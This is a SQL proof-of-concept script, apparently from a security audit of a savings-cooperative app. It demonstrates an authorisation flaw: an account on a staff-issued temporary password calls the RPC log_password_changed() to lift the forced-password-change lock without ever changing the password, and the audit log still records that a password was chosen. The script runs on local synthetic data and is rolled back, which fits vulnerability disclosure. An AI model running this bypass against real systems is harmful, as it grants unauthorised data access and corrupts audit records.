-- =====================================================================
-- BKC-01 PROOF OF CONCEPT
-- Disposable local PostgreSQL 16, synthetic seed data only.
-- Nothing here touches any hosted project.
-- =====================================================================
\set ON_ERROR_STOP on
begin;

-- Staff register a member: a login is created for them with a temporary
-- password, exactly as issue_temporary_password()/member onboarding does.
do $$
declare v uuid := gen_random_uuid(); m uuid;
begin
  select id into m from members where user_id is null and status = 'active' limit 1;
  insert into auth.users (id, aud, role, email, encrypted_password, email_confirmed_at,
                          raw_app_meta_data, raw_user_meta_data, created_at, updated_at)
  values (v, 'authenticated', 'authenticated', 'bkc01.synth@member.invalid',
          'TEMP-PASSWORD-HASH-PLACEHOLDER', now(),
          jsonb_build_object('member_id', m), jsonb_build_object('full_name','BKC01 Synthetic'),
          now(), now());
  update app_users set must_change_password = true, password_set_at = null where id = v;
  perform set_config('audit.victim', v::text, false);
end $$;

select '1. SETUP — account is on a staff-issued temporary password' as step,
       m.member_no, u.role, u.must_change_password, u.password_set_at
  from app_users u join members m on m.user_id = u.id
 where u.id = current_setting('audit.victim')::uuid;

-- Become that account exactly as PostgREST does for a bearer token: the only
-- thing an attacker needs is the temporary password they were handed.
select set_config('request.jwt.claims',
       json_build_object('sub', current_setting('audit.victim'), 'role','authenticated')::text, false);
set local role authenticated;

select '2. BEFORE — the forced-change lock closes the data' as step,
       (select must_change_password from app_users where id = auth.uid()) as lock_held,
       current_member_id() is not null as own_member_record_reachable,
       is_staff_user() as staff_access,
       (select count(*) from transactions) as transactions_visible;

-- ===== THE EXPLOIT =====
-- One RPC, granted to `authenticated` in migration 0034. No password argument,
-- no proof that auth.users.encrypted_password changed.
--   POST /rest/v1/rpc/log_password_changed   Authorization: Bearer <temp-pw token>
select log_password_changed() as exploit_call;

select '3. AFTER — lock cleared, password never changed' as step,
       (select must_change_password from app_users where id = auth.uid()) as lock_held,
       (select password_set_at is not null from app_users where id = auth.uid()) as db_claims_pw_chosen,
       current_member_id() is not null as own_member_record_reachable,
       (select count(*) from transactions) as transactions_visible;

reset role;
select '4. CREDENTIAL — the temporary password is still the live password' as step,
       encrypted_password as auth_users_encrypted_password
  from auth.users where id = current_setting('audit.victim')::uuid;

select '5. AUDIT TRAIL — the SACCO is told a password was chosen' as step,
       action, summary
  from audit_logs where actor_id = current_setting('audit.victim')::uuid;

rollback;
